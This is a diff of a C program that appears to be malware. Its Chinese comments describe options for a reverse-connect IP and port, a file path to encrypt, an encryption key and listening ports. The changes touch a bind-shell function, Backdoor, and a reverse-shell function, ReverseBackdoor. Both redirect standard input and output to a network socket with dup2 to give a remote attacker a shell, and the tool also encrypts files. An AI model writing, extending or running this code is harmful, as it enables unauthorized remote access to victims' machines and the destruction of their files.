@@ -6,9 +6,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netdb.h>
-#include<pthread.h>
-
-#define DEBUG
+#include <pthread.h>
 
 #define branch_CodeBegin			do {
 #define branch_CodeEnd				} while( 0 );
@@ -66,21 +64,27 @@ int main(int argc, char **argv)
     int opt = 0 ;
     if(argc > 1)
     {
-        while(-1 != (opt = getopt(argc, argv,"a:p:f:k:l:")))
+        while(-1 != (opt = getopt(argc, argv,"a:d:p:f:k:l:")))
         {
             switch(opt)
             {
-                case 'a':
+                case 'a': // 反向连接的ip
                     strcpy(g_ip, optarg) ;
                     break ;
-                case 'p':
+                case 'p': // 反向连接的端口
                     g_port = atoi(optarg) ;
                     break ;
-                case 'f':
+                case 'f':   // 待加密路径
                     strcpy(g_filepath, optarg) ;
                     break ;
-                case 'k':
+                case 'k':   // 加密密钥
                     g_key = (char)atoi(optarg) ;
+                    break ;
+                case 'd':   // 正向连接监听端口
+                    g_dport = atoi(optarg) ;
+                    break ;
+                case 'l':   // 开启本地服务监听端口
+                    g_listenport = atoi(optarg) ;
                     break ;
             }
         }
@@ -210,10 +214,9 @@ int Backdoor(void)
         clnt_sock = accept(sock, (struct sockaddr*)&clnt_addr,&clnt_addr_size);
         if(clnt_sock != -1)
         {
-            #define MESSAGE "hacker welcome !\n"
-            send(clnt_sock, MESSAGE, sizeof(MESSAGE), 0);
-            printf("send %s", MESSAGE) ;
-            #undef MESSAGE
+            send(clnt_sock, Welcome, sizeof(Welcome), 0);
+            printf("send %s", Welcome) ;
+
             dup2(clnt_sock, 0);
             dup2(clnt_sock, 1);
             dup2(clnt_sock, 2);
@@ -249,10 +252,8 @@ int ReverseBackdoor(void)
         close(sock) ;
         return -1;
     }
-    #define MESSAGE "hacker welcome !\n"
-    send(sock, MESSAGE, sizeof(MESSAGE), 0);
-    printf("send %s", MESSAGE) ;
-    #undef MESSAGE
+    send(sock, Welcome, sizeof(Welcome), 0);
+    printf("send %s", Welcome) ;
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
